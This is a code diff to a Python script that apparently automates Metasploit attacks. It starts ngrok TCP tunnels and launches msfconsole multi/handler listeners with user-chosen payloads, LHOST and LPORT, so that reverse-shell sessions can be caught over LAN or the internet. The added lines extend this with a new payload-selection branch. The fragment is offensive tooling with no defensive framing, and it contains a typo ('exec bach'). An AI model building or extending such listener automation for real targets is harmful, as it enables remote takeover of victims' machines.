@@ -240,7 +240,7 @@ else:
 
 def startNgrokServer(ngrokPORT):
 
-    command = f"gnome-terminal --geometry=80x24+1000+50 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
+    command = f"gnome-terminal --geometry=80x24+990+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
     subprocess.run(command, shell=True)
 
 
@@ -337,6 +337,11 @@ def setPayload():
             else: pass
             if lanORwan.lower() == "y":
                 command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {ngrok_PORT}; exploit; exec bash\"'"
+            elif choice == "3":
+                if lanORwan.lower() == "y":
+                    command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {module}; set LHOST {HOST}; set LPORT {ngrok_PORT}; exploit; exec bash\"'"
+                else:
+                    command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {module}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"
             else:
                 command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"  
           
